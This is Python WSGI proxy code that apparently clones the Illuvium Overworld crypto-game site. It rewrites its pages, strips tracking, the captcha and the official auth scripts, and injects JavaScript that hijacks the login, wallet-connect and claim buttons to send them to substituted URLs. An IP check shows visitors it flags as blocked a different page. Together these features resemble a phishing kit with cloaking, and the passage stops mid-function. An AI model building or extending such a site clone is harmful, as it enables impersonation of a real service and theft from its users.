import os
import sys
import logging
import traceback
import re
from urllib.parse import parse_qs, urlparse
import mimetypes
import urllib.parse
import requests
from urllib.parse import urljoin
import io

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Original site URL
ORIGINAL_SITE = "https://overworld.illuvium.io"

# Custom function to get client IP from WSGI environment
def get_client_ip_wsgi(environ):
    """
    Extract the client IP address from the WSGI environment.
    
    Args:
        environ: The WSGI environment dictionary
        
    Returns:
        str: The client IP address
    """
    # Try to get IP from various WSGI environment variables
    if 'HTTP_CLIENT_IP' in environ:
        return environ['HTTP_CLIENT_IP']
    
    if 'HTTP_X_FORWARDED_FOR' in environ:
        # X-Forwarded-For can contain multiple IPs, take the first one
        return environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
    
    if 'HTTP_X_REAL_IP' in environ:
        return environ['HTTP_X_REAL_IP']
    
    # Fall back to the remote address
    return environ.get('REMOTE_ADDR', '127.0.0.1')

# Import your IP validator (if available)
try:
    from ip_validator import validate_ip, x_deux_check_mail
    # Note: We're not importing get_client_ip from ip_validator anymore
    # We'll use our custom get_client_ip_wsgi function instead
except ImportError:
    # Fallback if the module isn't available
    logger.warning("IP validator module not found, using fallback functions")
    def validate_ip(ip, site):
        return False
    
    def x_deux_check_mail(site):
        return "<html><body>Placeholder</body></html>"

class WSGIHandler:
    def __init__(self):
        self.directory = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'App_files/Assets')

    def rewrite_urls(self, content):
        """Rewrite URLs to point to proxy server."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')

        # Fix Next.js image URLs
        def nextjs_image_replacer(match):
            url = match.group(0)
            # Convert _next/image?url=<encoded>&w=<width>&q=<quality> 
            # to appropriate local URL
            if '_next/image' in url and 'url=' in url:
                try:
                    # Extract the original URL
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    if 'url' in params:
                        original_url = urllib.parse.unquote(params['url'][0])
                        # Make relative URLs absolute
                        if original_url.startswith('/'):
                            original_url = f"App_files/Assets{original_url}"
                        return original_url
                except Exception as e:
                    self.logger.error(f"Error processing Next.js image URL: {e}")
            return url

        # Replace Next.js image URLs
        content = re.sub(r'/_next/image\?[^"\']+', nextjs_image_replacer, content)
        
        # Fix autodrone.html references
        content = content.replace('autodrone.html', '/autodrone.html')
        
        # Add leading slashes to resources that need them
        content = re.sub(r'src="(?!https?://|/|data:|#)([^"]+)"', r'src="/\1"', content)
        content = re.sub(r'href="(?!https?://|/|data:|#|javascript:|mailto:)([^"]+)"', r'href="/\1"', content)

        # Original URL rewriting logic
        content = content.replace('href="/', 'href="/proxy/')
        content = content.replace('src="/', 'src="/proxy/')
        content = content.replace("href='/", "href='/proxy/")
        content = content.replace("src='/", "src='/proxy/")
        
        # Fix double proxy issues
        content = content.replace('/proxy/proxy/', '/proxy/')
        
        return content.encode('utf-8')
        
    def modify_buttons_and_links(self, content):
        """Modify specific buttons, links, and their functionality."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Log the length of content before modifications
        logger.info(f"Modifying buttons in HTML content of length: {len(content)}")
        
        # 1. Basic button and link modifications
        content = content.replace(
            'class="chakra-button css-tm757x"',
            'class="chakra-button css-tm757x modified-button"'
        )
        
        # 2. Replace login button text - simpler approach
        content = content.replace(
            'Log In with Passport',
            'Custom Login'
        )
        
        # 3. Modify Epic Games launcher links - direct replacement
        content = content.replace(
            'com.epicgames.launcher://store/product/illuvium-60064c',
            'https://google.com?action=epic-redirect'
        )
        
        # 4. Modify Immutable links - direct replacement
        content = content.replace(
            'https://auth.immutable.com',
            'https://google.com?action=immutable-login'
        )
        
        # 5. Add minimal JavaScript that won't block loading
        minimal_script = '''
        <script>
        // Wait for the page to be fully loaded before applying button changes
        window.addEventListener('load', function() {
            console.log('Button modification script running');
            
            // Simple function to prevent default and redirect
            function redirectHandler(e, url) {
                e.preventDefault();
                window.location.href = url;
            }
            
            // Add event listeners with timeout to allow app to initialize first
            setTimeout(function() {
                // Handle claim/redeem buttons
                document.querySelectorAll('button, a.chakra-button').forEach(function(btn) {
                    if (!btn.textContent) return;
                    var text = btn.textContent.toLowerCase();
                    
                    if (text.includes('claim') || text.includes('redeem')) {
                        btn.addEventListener('click', function(e) {
                            redirectHandler(e, 'https://google.com?action=claim');
                        });
                    }
                    
                    if (text.includes('play') || text.includes('launch')) {
                        btn.addEventListener('click', function(e) {
                            redirectHandler(e, 'https://google.com?action=play');
                        });
                    }
                    
                    if (text.includes('connect') || text.includes('wallet') || text.includes('login') || text.includes('log in')) {
                        btn.addEventListener('click', function(e) {
                            redirectHandler(e, 'https://google.com?action=wallet');
                        });
                    }
                });
                
                // Add a subtle indicator to show the script is working
                var indicator = document.createElement('div');
                indicator.style.cssText = 'position:fixed;bottom:10px;right:10px;width:10px;height:10px;background:green;border-radius:50%;z-index:9999;opacity:0.5;';
                document.body.appendChild(indicator);
                
            }, 2000); // Delay to ensure app is ready
        });
        </script>
        '''
        
        # Insert minimal script before the closing body tag
        if '</body>' in content:
            content = content.replace('</body>', f'{minimal_script}</body>')
            logger.info("Minimal button script injected successfully")
        
        logger.info("Basic button modifications completed")
        return content.encode('utf-8')

    def modify_text_content(self, content):
        """Replace text content in HTML elements using JavaScript."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
            
        logger.info("Adding text replacement functionality")
        
        # JavaScript to replace text in elements matching a selector
        text_replacement_script = '''
        <script>
        // Function to replace text in elements matching a selector
        function replaceTextInElements(selector, originalText, newText, exactMatch = false) {
            const elements = document.querySelectorAll(selector);
            elements.forEach(element => {
                if (exactMatch) {
                    if (element.textContent.trim() === originalText) {
                        element.textContent = newText;
                    }
                } else {
                    if (element.textContent.includes(originalText)) {
                        element.textContent = element.textContent.replace(originalText, newText);
                    }
                }
            });
            console.log(`Replaced "${originalText}" with "${newText}" in ${elements.length} elements matching "${selector}"`);
        }
        
        // Function to replace all instances of text across the entire page
        function replaceAllTextOnPage(originalText, newText) {
            const walker = document.createTreeWalker(
                document.body, 
                NodeFilter.SHOW_TEXT, 
                null, 
                false
            );
            
            let node;
            let count = 0;
            
            while (node = walker.nextNode()) {
                if (node.nodeValue.includes(originalText)) {
                    node.nodeValue = node.nodeValue.replace(new RegExp(originalText, 'g'), newText);
                    count++;
                }
            }
            
            console.log(`Replaced all instances of "${originalText}" with "${newText}" (${count} text nodes affected)`);
        }
        
        // Apply replacements when the page is fully loaded
        window.addEventListener('load', function() {
            // Wait for all dynamic content to render
            setTimeout(function() {
                // Replace specific text elements
                
                // Example replacements
                replaceTextInElements('h1, h2, h3, h4, h5', 'Illuvium', 'My Game', false);
                replaceTextInElements('button, a.chakra-button', 'Play Now', 'Start Game', true);
                replaceTextInElements('button, a.chakra-button', 'Claim', 'Get Reward', false);
                replaceTextInElements('button, a.chakra-button', 'Connect', 'Link Account', false);
                
                // Global replacements across all text nodes
                replaceAllTextOnPage('Passport', 'Account');
                replaceAllTextOnPage('wallet', 'account');
                
                console.log('Text replacement complete');
            }, 2000); // Delay to ensure app is fully loaded
        });
        </script>
        '''
        
        # Insert text replacement script before the closing body tag
        if '</body>' in content:
            content = content.replace('</body>', f'{text_replacement_script}</body>')
            logger.info("Text replacement script injected successfully")
        
        return content.encode('utf-8')

    # Added function that was in server.py to remove tracking scripts
    def remove_tracking_scripts(self, content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content.encode('utf-8')

    def inject_load_complete_script(self, content):
        """Inject load-complete.js script into HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Find the closing </body> tag
        if '</body>' in content:
            try:
                # Read the load-complete.js file
                with open('load-complete.js', 'r') as f:
                    script_content = f.read()
                # Inject the script before the closing body tag
                content = content.replace('</body>', f'<script>{script_content}</script></body>')
            except Exception as e:
                logger.error(f"Error reading load-complete.js: {str(e)}")
    
        return content.encode('utf-8')
    
    def modify_chunk_content(self, content):
        """Modify chunk file content before serving."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Replace Epic Games launcher URL with https://google.com
        content = content.replace(
            '"com.epicgames.launcher://store/product/illuvium-60064c"',
            '"https://google.com"'
        )
        
        # Also handle cases where the URL might be in single quotes
        content = content.replace(
            "'com.epicgames.launcher://store/product/illuvium-60064c'",
            "'https://google.com'"
        )
        
        # Handle cases where the URL might be part of a larger string
        content = content.replace(
            'https://auth.immutable.com',
            'https://google.com?id='
        )

        content = content.replace(
            '"Log In with Passport"',
            '"Log In with Google"'
        )
        
        return content.encode('utf-8')
    
    def modify_html_text(self, content):
        """Replace specific text content in HTML elements."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
            
        # Common text replacements
        replacements = {
            # Button text replacements
            'Log In with Passport': 'Custom Login',
            'Connect Wallet': 'Custom Wallet',
            'Play Now': 'Play Game',
            'Launch Game': 'Start Game',
            'Claim': 'Get Reward',
            'Redeem': 'Get Item',
            
            # Header/title replacements
            'Illuvium | Overworld': 'Game Portal',
            'Overworld': 'Game World',
            
            # Content text replacements
            'survive the Overworld': 'explore the Game World',
            'teeming with Illuvials': 'filled with creatures',
            
            # Footer text replacements
            '© 2023 Illuvium. All Rights Reserved': '© 2025 Game Portal. All Rights Reserved',
        }
        
        # Apply all text replacements
        for original, replacement in replacements.items():
            content = content.replace(original, replacement)
        
        # Use regex for more targeted replacements with HTML context
        
        # Replace text in specific button elements
        content = re.sub(
            r'(<button[^>]*class="[^"]*play[^"]*"[^>]*>)(.*?)(</button>)',
            r'\1Play Game\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace text in specific header elements
        content = re.sub(
            r'(<h1[^>]*>)(.*?Illuvium.*?)(</h1>)',
            r'\1Game Portal\3', 
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace text in paragraphs containing specific keywords
        content = re.sub(
            r'(<p[^>]*>)(.*?passport.*?)(</p>)',
            r'\1Login with your custom account\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Replace modal dialog text
        content = re.sub(
            r'(class="[^"]*modal-title[^"]*"[^>]*>)(.*?)(</)',
            r'\1Custom Action\3',
            content,
            flags=re.DOTALL|re.IGNORECASE
        )
        
        # Add JavaScript to dynamically modify text that might be added after page load
        dynamic_text_script = '''
        <script>
        // Run when DOM is loaded and then periodically
        function updateDynamicText() {
            // Text replacement map
            const textMap = {
                'Log In with Passport': 'Custom Login',
                'Connect Wallet': 'Custom Wallet',
                'Play Now': 'Play Game',
                'Launch Game': 'Start Game',
                'Claim': 'Get Reward',
                'Redeem': 'Get Item',
                'Illuvium | Overworld': 'Game Portal',
                'Overworld': 'Game World'
            };
            
            // Function to replace text in an element and its children
            function replaceTextInNode(node) {
                if (node.nodeType === 3) { // Text node
                    let text = node.nodeValue;
                    let changed = false;
                    
                    // Apply all replacements
                    for (const [original, replacement] of Object.entries(textMap)) {
                        if (text.includes(original)) {
                            text = text.replace(new RegExp(original, 'g'), replacement);
                            changed = true;
                        }
                    }
                    
                    // Only update if changed
                    if (changed) {
                        node.nodeValue = text;
                    }
                } else if (node.nodeType === 1) { // Element node
                    // Skip script and style elements
                    if (node.tagName !== 'SCRIPT' && node.tagName !== 'STYLE') {
                        // Process children
                        Array.from(node.childNodes).forEach(replaceTextInNode);
                    }
                }
            }
            
            // Start at body
            replaceTextInNode(document.body);
            
            // Also update page title
            if (document.title.includes('Illuvium')) {
                document.title = 'Game Portal';
            }
        }
        
        // Run immediately after page load
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', updateDynamicText);
        } else {
            updateDynamicText();
        }
        
        // Then run periodically to catch dynamic content
        setInterval(updateDynamicText, 1000);
        </script>
        '''
        
        # Insert the script before the closing body tag
        if '</body>' in content:
            content = content.replace('</body>', f'{dynamic_text_script}</body>')
        
        return content.encode('utf-8')

    def modify_html_content(self, content):
        """Modify HTML content including button classes and links."""
        if isinstance(content, bytes):
            content = content.decode('utf-8')
    
        # First, block Magic SDK and related scripts completely
        # This prevents auth iframes from loading and interfering with our button control
        content = content.replace('<script async="" src="https://static.geetest.com/v4/gt4.js"></script>', '')
        
        # Block Magic SDK scripts
        content = re.sub(r'<script[^>]*magic[^>]*>.*?</script>', '', content, flags=re.DOTALL)
        content = re.sub(r'<script[^>]*auth\.immutable\.com[^>]*>.*?</script>', '', content, flags=re.DOTALL)
        
        # Remove any loading of the Magic SDK
        content = content.replace('https://auth.magic.link', 'https://google.com?blocked=magic')
        
        # Block scripts that might interfere with our control
        content = content.replace('https://static.moonpay.com/web-sdk', 'https://google.com?blocked=moonpay')

        # Directly modify the "Play for Free" button text
        content = content.replace(
            '<button type="button" class="chakra-button css-1253haw">Play for Free</button>',
            '<button type="button" class="chakra-button css-1253haw">Start Game Now</button>'
        )
        
        # Additional button text replacements
        content = content.replace('>Play for Free<', '>Start Game Now<')
        content = content.replace('>Play Now<', '>Start Game<')
        content = content.replace('>Launch App<', '>Open Game<')
        content = content.replace('>Log In with Passport<', '>Custom Login<')

        # Add loading overlay script and CSS at the beginning of the body
        loading_overlay = '''
        <div id="loading-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background-color: #000; opacity: 1; z-index: 10000; display: flex; 
            justify-content: center; align-items: center; transition: opacity 0.5s ease;">
            <div style="text-align: center; color: white;">
                <div class="loading-spinner" style="width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.3); 
                    border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite;"></div>
                <p style="margin-top: 20px; font-size: 18px;">Loading Game Interface...</p>
            </div>
        </div>
        <style>
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            body {
                overflow: hidden; /* Prevent scrolling during loading */
            }
            body.loaded {
                overflow: auto; /* Allow scrolling after loading */
            }
        </style>
        <script>
            // Hide content during loading
            document.documentElement.style.visibility = 'hidden';
            
            // Wait for window load
            window.addEventListener('load', function() {
                // Delay hiding the overlay to ensure all modifications are complete
                setTimeout(function() {
                    var overlay = document.getElementById('loading-overlay');
                    if (overlay) {
                        overlay.style.opacity = '0';
                        
                        // After fade out animation completes, remove the overlay
                        setTimeout(function() {
                            overlay.style.display = 'none';
                            document.body.classList.add('loaded');
                            document.documentElement.style.visibility = 'visible';
                        }, 500);
                    }
                }, 5000); // 5 second delay
            });
            
            // Make sure everything is visible even if something goes wrong with the overlay
            setTimeout(function() {
                document.documentElement.style.visibility = 'visible';
                var overlay = document.getElementById('loading-overlay');
                if (overlay) {
                    overlay.style.display = 'none';
                }
                document.body.classList.add('loaded');
            }, 10000); // Failsafe: force visibility after 10 seconds
        </script>
        '''
    
        # Insert the loading overlay at the beginning of the body tag
        if '<body' in content:
            body_pos = content.find('<body')
            close_body_tag = content.find('>', body_pos)
            if close_body_tag > 0:
                content = content[:close_body_tag + 1] + loading_overlay + content[close_body_tag + 1:]
        
        # Add our super-early interceptor script to the HEAD
        interceptor_script = '''
        <script>
        // Create an unremovable system to intercept all button and link clicks
        (function() {
            console.log("Button interceptor installed");
            
            // Store original addEventListener
            const originalAddEventListener = EventTarget.prototype.addEventListener;
            
            // Override addEventListener to intercept click handlers
            EventTarget.prototype.addEventListener = function(type, listener, options) {
                if (type === 'click') {
                    // Wrap the listener to check if we want to override
                    const wrappedListener = function(event) {
                        // Check if this is a button or link we want to control
                        const target = event.currentTarget;
                        
                        // Login/Connect/Wallet buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('log in') || 
                             target.textContent.toLowerCase().includes('passport') ||
                             target.textContent.toLowerCase().includes('connect') ||
                             target.textContent.toLowerCase().includes('wallet'))) {
                            console.log("Intercepted login/connect button click", target);
                            event.preventDefault();
                            event.stopPropagation();
                            window.location.href = 'https://google.com?action=wallet';
                            return false;
                        }
                        
                        // Play/Launch buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('play') || 
                             target.textContent.toLowerCase().includes('launch'))) {
                            console.log("Intercepted play button click", target);
                            event.preventDefault();
                            event.stopPropagation();
                            window.location.href = 'https://google.com?action=play';
                            return false;
                        }
                        
                        // Claim/Redeem buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('claim') || 
                             target.textContent.toLowerCase().includes('redeem'))) {
                            console.log("Intercepted claim button click", target);
                            event.preventDefault();
                            event.stopPropagation();
                            window.location.href = 'https://google.com?action=claim';
                            return false;
                        }
                        
                        // Check for Epic Games links
                        if (target.href && target.href.includes('epicgames')) {
                            console.log("Intercepted Epic Games link click", target);
                            event.preventDefault();
                            event.stopPropagation();
                            window.location.href = 'https://google.com?action=epic-redirect';
                            return false;
                        }
                        
                        // Check for Immutable links
                        if (target.href && target.href.includes('immutable.com')) {
                            console.log("Intercepted Immutable link click", target);
                            event.preventDefault();
                            event.stopPropagation();
                            window.location.href = 'https://google.com?action=immutable-login';
                            return false;
                        }
                        
                        // Allow the original listener to run for other cases
                        listener.apply(this, arguments);
                    };
                    
                    // Call the original addEventListener with our wrapped listener
                    return originalAddEventListener.call(this, type, wrappedListener, options);
                } else {
                    // For non-click events, just call the original
                    return originalAddEventListener.call(this, type, listener, options);
                }
            };
            
            // Override direct click assignment
            const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'onclick');
            Object.defineProperty(HTMLElement.prototype, 'onclick', {
                set: function(clickHandler) {
                    const wrappedHandler = function(event) {
                        // Perform the same checks as above
                        const target = event.currentTarget;
                        
                        // Login/Wallet buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('log in') || 
                             target.textContent.toLowerCase().includes('passport') ||
                             target.textContent.toLowerCase().includes('connect') ||
                             target.textContent.toLowerCase().includes('wallet'))) {
                            console.log("Intercepted onclick login button", target);
                            event.preventDefault();
                            window.location.href = 'https://google.com?action=wallet';
                            return false;
                        }
                        
                        // Play/Launch buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('play') || 
                             target.textContent.toLowerCase().includes('launch'))) {
                            console.log("Intercepted onclick play button", target);
                            event.preventDefault();
                            window.location.href = 'https://google.com?action=play';
                            return false;
                        }
                        
                        // Claim/Redeem buttons
                        if (target.textContent && 
                            (target.textContent.toLowerCase().includes('claim') || 
                             target.textContent.toLowerCase().includes('redeem'))) {
                            console.log("Intercepted onclick claim button", target);
                            event.preventDefault();
                            window.location.href = 'https://google.com?action=claim';
                            return false;
                        }
                        
                        // If we didn't intercept, call the original handler
                        if (clickHandler) {
                            return clickHandler.apply(this, arguments);
                        }
                    };
                    
                    this.addEventListener('click', wrappedHandler);
                    this._wrappedClickHandler = wrappedHandler;
                },
                get: function() {
                    return this._wrappedClickHandler || null;
                },
                configurable: true
            });
            
            // Create a global click interceptor as well
            document.addEventListener('click', function(event) {
                // Check if the click is on a button or link
                let target = event.target;
                
                // Walk up the DOM tree to find the button or link
                while (target && target !== document) {
                    const tagName = target.tagName.toLowerCase();
                    const text = target.textContent ? target.textContent.toLowerCase() : '';
                    const href = target.getAttribute ? target.getAttribute('href') : '';
                    
                    // Check for login/connect buttons
                    if ((tagName === 'button' || tagName === 'a') && 
                        (text.includes('log in') || text.includes('passport') || 
                         text.includes('connect') || text.includes('wallet'))) {
                        console.log("Global interceptor caught login button click", target);
                        event.preventDefault();
                        event.stopPropagation();
                        window.location.href = 'https://google.com?action=wallet';
                        return false;
                    }
                    
                    // Check for play buttons
                    if ((tagName === 'button' || tagName === 'a') && 
                        (text.includes('play') || text.includes('launch'))) {
                        console.log("Global interceptor caught play button click", target);
                        event.preventDefault();
                        event.stopPropagation();
                        window.location.href = 'https://google.com?action=play';
                        return false;
                    }
                    
                    // Check for claim buttons
                    if ((tagName === 'button' || tagName === 'a') && 
                        (text.includes('claim') || text.includes('redeem'))) {
                        console.log("Global interceptor caught claim button click", target);
                        event.preventDefault();
                        event.stopPropagation();
                        window.location.href = 'https://google.com?action=claim';
                        return false;
                    }
                    
                    // Check for Epic Games links
                    if (href && href.includes('epicgames')) {
                        console.log("Global interceptor caught Epic Games link click", target);
                        event.preventDefault();
                        event.stopPropagation();
                        window.location.href = 'https://google.com?action=epic-redirect';
                        return false;
                    }
                    
                    // Check for Immutable links
                    if (href && href.includes('immutable.com')) {
                        console.log("Global interceptor caught Immutable link click", target);
                        event.preventDefault();
                        event.stopPropagation();
                        window.location.href = 'https://google.com?action=immutable-login';
                        return false;
                    }
                    
                    target = target.parentNode;
                }
            }, true); // Use capturing to get the event before other handlers
            
            // Add a visual indicator that our interceptor is active
            window.addEventListener('load', function() {
                // Removed: Visual indicator code
                
                // Add a counter for intercepted clicks
                let interceptCount = 0;
                // Removed: Visual counter element
                
                // Update the counter when we intercept a click
                const originalLog = console.log;
                console.log = function() {
                    if (arguments[0] && arguments[0].includes && arguments[0].includes('Intercepted')) {
                        interceptCount++;
                        // Counter update removed
                    }
                    return originalLog.apply(console, arguments);
                };
                
                // Immediately fix button texts that might be dynamically loaded
                setTimeout(function() {
                    // Find and modify specific button texts
                    document.querySelectorAll('button, a.chakra-button').forEach(function(button) {
                        // Target the specific "Play for Free" button with class css-1253haw
                        if (button.classList.contains('css-1253haw') && button.textContent.includes('Play for Free')) {
                            button.textContent = 'Start Game Now';
                            console.log('Modified "Play for Free" button text');
                        }
                        
                        // Handle other buttons
                        if (button.textContent.includes('Play for Free')) {
                            button.textContent = button.textContent.replace('Play for Free', 'Start Game Now');
                        }
                        if (button.textContent.includes('Play Now')) {
                            button.textContent = button.textContent.replace('Play Now', 'Start Game');
                        }
                        if (button.textContent.includes('Launch App')) {
                            button.textContent = button.textContent.replace('Launch App', 'Open Game');
                        }
                        if (button.textContent.includes('Log In with Passport')) {
                            button.textContent = button.textContent.replace('Log In with Passport', 'Custom Login');
                        }
                    });
                }, 1000);
                
                // Add script to handle X-Frame-Options errors
                const style = document.createElement('style');
                style.textContent = `
                    .custom-redirect {
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background-color: rgba(0,0,0,0.8);
                        color: white;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 9999;
                        transition: opacity 0.3s;
                    }
                    .custom-redirect-content {
                        background-color: #222;
                        padding: 30px;
                        border-radius: 10px;
                        text-align: center;
                        max-width: 80%;
                    }
                    .custom-redirect-btn {
                        background-color: #4CAF50;
                        border: none;
                        color: white;
                        padding: 10px 20px;
                        margin-top: 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                    }
                `;
                document.head.appendChild(style);
                
                // Override the window.location redirects with custom UI
                const originalAssign = window.location.assign;
                const originalReplace = window.location.replace;
                const originalHref = Object.getOwnPropertyDescriptor(window.location, 'href');
                
                function showCustomRedirect(url) {
                    const actionType = new URL(url).searchParams.get('action') || 'unknown';
                    
                    const overlay = document.createElement('div');
                    overlay.className = 'custom-redirect';
                    
                    let actionText = 'Performing action...';
                    let buttonText = 'Continue';
                    
                    switch(actionType) {
                        case 'play':
                            actionText = 'Starting Game...';
                            buttonText = 'Play Now';
                            break;
                        case 'wallet':
                            actionText = 'Connecting Account...';
                            buttonText = 'Connect';
                            break;
                        case 'claim':
                            actionText = 'Claiming Reward...';
                            buttonText = 'Claim';
                            break;
                        case 'epic-redirect':
                            actionText = 'Opening Game Store...';
                            buttonText = 'Continue';
                            break;
                        case 'immutable-login':
                            actionText = 'Logging in...';
                            buttonText = 'Continue';
                            break;
                    }
                    
                    overlay.innerHTML = `
                        <div class="custom-redirect-content">
                            <h2>${actionText}</h2>
                            <p>This action would normally redirect you to an external site.</p>
                            <button class="custom-redirect-btn">${buttonText}</button>
                        </div>
                    `;
                    
                    document.body.appendChild(overlay);
                    
                    overlay.querySelector('button').addEventListener('click', function() {
                        overlay.style.opacity = '0';
                        setTimeout(() => {
                            document.body.removeChild(overlay);
                        }, 300);
                    });
                    
                    return false;
                }
                
                // Override location.href setter
                Object.defineProperty(window.location, 'href', {
                    set: function(url) {
                        if (url.includes('google.com')) {
                            return showCustomRedirect(url);
                        }
                        return originalHref.set.call(this, url);
                    },
                    get: originalHref.get
                });
                
                // Override location.assign
                window.location.assign = function(url) {
                    if (url.includes('google.com')) {
                        return showCustomRedirect(url);
                    }
                    return originalAssign.call(this, url);
                };
                
                // Override location.replace
                window.location.replace = function(url) {
                    if (url.includes('google.com')) {
                        return showCustomRedirect(url);
                    }
                    return originalReplace.call(this, url);
                };
            });
        })();
        </script>
        '''

        # Inject interceptor script at the very beginning of the head
        if '<head>' in content:
            content = content.replace('<head>', '<head>' + interceptor_script)
        else:
            # If no head tag, add it right after the opening HTML tag
            content = content.replace('<html', interceptor_script + '<html')

        # Modify button classes - add specific classes for styling
        content = content.replace(
            'class="chakra-button css-tm757x"',
            'class="chakra-button css-tm757x claim-button"'
        )
    
        # Match buttons with "Play" text
        content = content.replace(
            '>Play Now<',
            ' class="play-button">Start Game<'
        )
        
        # Add play-button class to play buttons
        content = content.replace(
            'class="chakra-button css-1re3zmo"',
            'class="chakra-button css-1re3zmo play-button"'
        )
        
        # Replace login button text
        content = content.replace(
            '>Log In with Passport<',
            ' class="wallet-button">Custom Login<'
        )
        
        # Modify Epic Games launcher links
        content = content.replace(
            'com.epicgames.launcher://store/product/illuvium-60064c',
            'https://google.com?action=epic-redirect'
        )
        
        # Modify Immutable links
        content = content.replace(
            'https://auth.immutable.com',
            'https://google.com?action=immutable-login'
        )
    
        return content.encode('utf-8')    

    def __call__(self, environ, start_response):
        try:
            # Convert WSGI environ to HTTP request
            path = environ.get('PATH_INFO', '/')
            query_string = environ.get('QUERY_STRING', '')
            method = environ.get('REQUEST_METHOD', 'GET')
            
            # Fix malformed autodrone.html paths
            if path == '/autodrone.html':
                path = '/autodrone'
            
            # Create headers list
            headers = []
            
            # Get hostname from the environ
            host_url = f"http://{environ.get('HTTP_HOST', '127.0.0.1:8081')}"
            
            # Get client IP and validate it - use our custom function
            client_ip = get_client_ip_wsgi(environ)
            is_blocked = validate_ip(client_ip, ORIGINAL_SITE)
            
            if is_blocked:
                # IP is blocked, execute x_deux_check_mail and return its content
                html_content = x_deux_check_mail(ORIGINAL_SITE)
                
                # Log that we've executed the function
                logger.info(f"Executed x_deux_check_mail for blocked IP: {client_ip}, serving its content")
                
                # Return 200 OK with the fetched content
                start_response('200 OK', [('Content-Type', 'text/html')])
                return [html_content.encode('utf-8')]
            
            # Handle load-complete.js directly
            if path == '/load-complete.js':
                try:
                    with open('load-complete.js', 'rb') as f:
                        content = f.read()
                    start_response('200 OK', [('Content-Type', 'application/javascript')])
                    return [content]
                except Exception as e:
                    logger.error(f"Error serving load-complete.js: {str(e)}")
                    start_response('404 Not Found', [('Content-Type', 'text/plain')])
                    return [b'File not found']
            
            # Fix malformed Next.js image URLs with @ instead of ?
            if path.startswith('/_next/image@') or path.startswith('_next/image@'):
                fixed_path = path.replace('_next/image@', '/_next/image?')
                if not fixed_path.startswith('/'):
                    fixed_path = '/' + fixed_path
                
                logger.info(f"Fixed malformed Next.js image URL: {path} -> {fixed_path}")
                
                # Parse the URL components
                parsed = urllib.parse.urlparse(fixed_path)
                query = urllib.parse.parse_qs(parsed.query)
                
                if 'url' in query:
                    image_url = urllib.parse.unquote(query['url'][0])
                    if image_url.startswith('/'):
                        image_url = image_url[1:]
                    
                    # Try to find the image locally
                    local_image_path = os.path.join(self.directory, image_url)
                    logger.info(f"Looking for image at: {local_image_path}")
                    
                    if os.path.exists(local_image_path):
                        with open(local_image_path, 'rb') as f:
                            content = f.read()
                            content_type = mimetypes.guess_type(local_image_path)[0] or 'image/webp'
                            start_response('200 OK', [('Content-type', content_type)])
                            return [content]
                    
                    # If not found locally, try to fetch from original site
                    url = urljoin(ORIGINAL_SITE, image_url)
                    logger.info(f"Fetching image from original site: {url}")
                    response = requests.get(url, timeout=10)
                    if response.status_code == 200:
                        content = response.content
                        content_type = response.headers.get('Content-Type', 'image/webp')
                        start_response('200 OK', [('Content-type', content_type)])
                        return [content]
                
                # If we get here, we couldn't handle the image request
                logger.warning(f"Could not process fixed Next.js image request: {fixed_path}")
                start_response('200 OK', [('Content-type', 'image/webp')])
                # Return an empty pixel instead of a 400
                return [b'']
            
            # Special handling for Next.js image requests
            if path.startswith('/_next/image') and query_string:
                try:
                    query_params = urllib.parse.parse_qs(query_string)
                    if 'url' in query_params:
